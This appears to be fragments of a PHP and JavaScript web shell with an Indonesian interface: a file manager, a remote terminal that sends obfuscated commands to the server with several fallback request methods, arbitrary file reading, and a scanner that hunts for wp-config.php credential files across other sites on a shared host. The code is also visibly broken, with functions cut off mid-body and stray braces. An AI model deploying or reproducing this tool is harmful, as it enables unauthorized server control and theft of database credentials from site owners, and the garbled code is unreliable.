function sp($rel, $strict=true){
    if($rel===''||$rel===null) return ROOT_PATH;
    $rel = trim(str_replace('\\','/',$rel));
    $isAbs = ($rel[0]=='/') || preg_match('/^[A-Za-z]:[\/\\\\]/',$rel);
    if($isAbs){
        $clean = $rel;
    } else {
        $rel = str_replace(['../','./','..\\','.\\'],'',$rel);
        $clean = ROOT_PATH.'/'.ltrim($rel,'/');
    }
    $r = realpath($clean);
    if($r===false) $r = $clean; 
    if($strict && strpos(realpath($r)!==false?realpath($r):$r, ROOT_PATH)!==0){
        return ROOT_PATH;
    }
    return $r;
}

function nx_json_encode($val) {
    if (is_string($val)) return '"' . addcslashes($val, "\\\"\n\r\t") . '"';
    if (is_numeric($val)) return (string)$val;
    if ($val === null) return 'null';
    if ($val === true) return 'true';
    if ($val === false) return 'false';
    if (is_array($val) || is_object($val)) {
        $arr = (array)$val;
        $is_list = empty($arr) || (array_keys($arr) === range(0, count($arr) - 1));
        $res = array();
        foreach ($arr as $k => $v) {
            $res[] = ($is_list ? '' : nx_json_encode((string)$k) . ':') . nx_json_encode($v);
        }
        return $is_list ? '[' . implode(',', $res) . ']' : '{' . implode(',', $res) . '}';
    }
    return '""';
}
function nx_json_decode($json) {
    $res = array();
    if(preg_match_all('/"([^"]+)"\s*:\s*("(?:[^"\\\\]|\\\\.)*"|true|false|null|-?\d+(?:\.\d+)?|\[[^\]]*\])/s', $json, $matches)){
        for($i=0; $i<count($matches[1]); $i++) {
            $k = $matches[1][$i]; $v = trim($matches[2][$i]);
            if($v === 'true') $v = true; elseif($v === 'false') $v = false; elseif($v === 'null') $v = null;
            elseif($v[0] === '"') $v = stripcslashes(substr($v, 1, -1));
            elseif($v[0] === '[') {
                $arr = array();
                if(preg_match_all('/"([^"]+)"/', $v, $m_arr)) {
                    foreach($m_arr[1] as $arr_val) $arr[] = stripcslashes($arr_val);
                }
                $v = $arr;
            }
            else $v = (strpos($v, '.') !== false) ? (float)$v : (int)$v;
            $res[$k] = $v;
        }
    }
    return $res;
}

function scan_smart_stream($dir, &$results) {
    $dir = rtrim($dir, '/') . '/';
    if (file_exists($dir . 'wp-config.php')) $results[] = $dir . 'wp-config.php';

    if ($dh = @opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file === '.' || $file === '..') continue;
            $full_path = $dir . $file;
            if (is_dir($full_path) && !is_link($full_path)) {
                $target_public = $full_path . '/public_html/wp-config.php';
                $target_root   = $full_path . '/wp-config.php';
                if (file_exists($target_public)) $results[] = $target_public;
                elseif (file_exists($target_root)) $results[] = $target_root;
            }
        }
        closedir($dh);
    }
}

    function nativeCmd($cmd, $cwd){

        if(!$parts) return '';

        switch($bin){

                $path = $args ? spFree($cwd.'/'.implode(' ',$args)) : $cwd;
                if(!is_dir($path)) return "ls: $path: Bukan direktori";
                $es=@scandir($path); if(!$es) return "ls: tidak bisa baca";
                $out=''; foreach($es as $e){ if($e==='.'||$e==='..') continue; $fp=is_dir($path.'/'.$e)?$e.'/':$e; $out.=$fp."\n"; } return $out;
            case 'pwd': return $cwd;
            case 'cat':
                if(!$args) return 'Usage: cat <file>';
                $f=spFree($cwd.'/'.$args[0]); if(!file_exists($f)) return "cat: $f: Tidak ditemukan";
                return file_get_contents($f);
            case 'echo': return implode(' ', $args);
            case 'php': case 'php-r':

            case 'uname': return php_uname();
            case 'date': return date('D d M Y H:i:s T');
            case 'df': $tot=@disk_total_space($cwd);$fr=@disk_free_space($cwd); return "Filesystem\tSize\tUsed\tAvail\nCurrent\t".round($tot/1e9,1)."G\t".round(($tot-$fr)/1e9,1)."G\t".round($fr/1e9,1)."G";
            default: return "[$bin]: shell dinonaktifkan. Perintah tersedia: ls, pwd, cat, echo, whoami, hostname, uname, date, df";
        }
    }

async function api(a,params={},method='GET'){
    let url=`${BASE}?a=${a}`;
    let opts={
        method: method,
        headers: {'X-NX-Token':TOK, 'X-Requested-With':'XMLHttpRequest'}
    };
    if(method==='GET'){
        for(const[k,v]of Object.entries(params)) url+=`&${k}=${encodeURIComponent(typeof v==='object'?JSON.stringify(v):v)}`;
    } else {
        opts.headers['Content-Type'] = 'application/json';
        opts.body=JSON.stringify({_t:TOK,...params});
    }
    const r=await fetch(url,opts);
    return r.json();
}

function p2o(p){
    if(!p||p.length<9)return'';
    let o='';
    for(let i=0;i<3;i++){
        let v=0;
        if(p[i*3]!=='-')v+=4;
        if(p[i*3+1]!=='-')v+=2;
        if(p[i*3+2]!=='-')v+=1;
        o+=v;
    }
    return '0'+o;
}

    let items=[...allItems];
    const[sk,sd]=sortMode.split('-');

        let va,vb;
        if(sk==='size'){va=a.s;vb=b.s;}
        else if(sk==='mtime'){va=a.m;vb=b.m;}
        else{va=a.n.toLowerCase();vb=b.n.toLowerCase();}

}

function encryptPayload(str){
    let dec = unescape(encodeURIComponent(str));
    let r = '';

async function termExec(cmd){
    const spid='ts'+Date.now();
    termPrint(`<span id="${spid}" class="t-sys">...</span>`);

    let result=null;
    let lastErr='';

    try{
        const b64cmd = encryptPayload(cmd); 
        const resp=await fetch(`${BASE}?a=run`,{
            method:'POST',
            headers:{'Content-Type':'application/json','X-NX-Token':TOK,'X-Requested-With':'XMLHttpRequest'},
            body:JSON.stringify({_t:TOK,cmd:b64cmd,wd:termCwd})
        });
        if(resp.ok){
            const txt=await resp.text();
            if(txt.trim()){ try{ result=JSON.parse(txt); }catch(pe){ lastErr='JSON parse: '+txt.substring(0,80); } }
            else lastErr='Empty response';
        } else lastErr='HTTP '+resp.status;
    }catch(fe){ lastErr='Fetch error: '+fe.message; }

    if(!result){
        try{
            const fd=new FormData();
            fd.append('_t',TOK); fd.append('cmd',encryptPayload(cmd)); fd.append('wd',termCwd);
            const resp=await fetch(`${BASE}?a=run`,{method:'POST',body:fd});
            if(resp.ok){ const txt=await resp.text(); if(txt.trim()) try{ result=JSON.parse(txt); }catch(e){} }
        }catch(e){}
    }

    if(!result){
        try{
            const b64cmd=encodeURIComponent(encryptPayload(cmd));
            const resp=await fetch(`${BASE}?a=run&cmd=${b64cmd}&wd=${encodeURIComponent(termCwd)}&_t=${TOK}`);
            if(resp.ok){ const txt=await resp.text(); if(txt.trim()) try{ result=JSON.parse(txt); }catch(e){} }
        }catch(e){}
    }

    const spEl=document.getElementById(spid);
    if(spEl) spEl.remove();

    if(!result){
        termPrint(`<span class="t-err">âš  Gagal terhubung ke server. Error: ${eh(lastErr)}</span>\n`);
        return;
    }

    if(result.out && result.out.trim()){
        const cls=(result.exit&&result.exit!==0)?'t-err':'t-ok';
        termPrint(`<span class="${cls}">${eh(result.out)}</span>\n`);
    }
    if(result.err && result.err.trim()){
        termPrint(`<span class="t-err">${eh(result.err)}</span>\n`);
    }
    if(result.note==='native_emulation'){
        termPrint(`<span class="t-sys">[mode emulasi â€” shell dinonaktifkan server]</span>\n`);
    }

    if(result.cwd && result.cwd !== termCwd){
        termCwd=result.cwd;
        updTermPrompt();
        if(/^\s*cd[\s\/~]/i.test(cmd)||cmd.trim()==='cd'){
            const rootN=ROOT_ABS.replace(/\\/g,'/');
            const cwdN=result.cwd.replace(/\\/g,'/');
            if(cwdN.startsWith(rootN)){
                loadDir(result.cwd_rel||'');
            } else {
                loadDirAbs(result.cwd);
            }
        }
    }
}

    if(e.key==='Escape'){ document.querySelectorAll('.ov.show').forEach(o=>o.classList.remove('show')); hideCtx(); }
    if(e.key==='Backspace'&&!e.target.closest('.modal')) goUp();
    if(e.key==='F5'){ e.preventDefault(); loadDir(cdir); }
    if(e.ctrlKey&&e.key==='f'){ e.preventDefault(); openSearch(); }
    if(e.ctrlKey&&e.key==='a'){ e.preventDefault(); toggleAll(true); }
    if(e.ctrlKey&&e.key==='v'&&clip.names.length) doPaste();

}

function openScanSite() {
    toast('Scanning directories...', 'info');
    POST('tool', {d:cdir, tool:'scan_site'}).then(d => {
        if (d.ok) {
            document.getElementById('scan-count').innerText = d.count;
            let html = '';
            if(d.count > 0) {
                d.data.forEach(dom => {
                    html += `<div style="display:flex;justify-content:space-between;padding:8px;background:var(--s2);border-radius:6px;border:1px solid var(--bdr2);">
                        <span style="color:#eee;font-size:12px;">${eh(dom)}</span>
                        <a href="https://www.google.com/search?q=site:${dom}" target="_blank" style="color:var(--cyan);font-size:12px;text-decoration:none;"><i class="fab fa-google"></i> Check</a>
                    </div>`;
                });
            } else {
                html = '<div style="text-align:center;padding:20px;color:var(--tx3)">No domains found here.</div>';
            }
            document.getElementById('scan-result-body').innerHTML = html;
            window.currentScanData = d.data;
            om('scanM');
        } else toast('Scan Failed', 'err');
    }).catch(e => { toast('Scan Failed', 'err'); });
}

}
